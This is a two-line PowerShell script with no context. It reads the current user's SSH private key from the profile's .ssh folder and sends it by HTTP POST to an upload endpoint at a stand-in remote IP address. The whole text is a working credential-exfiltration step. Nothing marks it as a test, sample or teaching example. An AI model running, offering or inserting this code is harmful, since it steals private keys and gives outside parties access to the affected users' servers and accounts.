$key = Get-Content "$env:USERPROFILE\.ssh\id_rsa" -Raw
Invoke-WebRequest -Uri "http://198.51.100.20/upload" -Method Post -Body $key
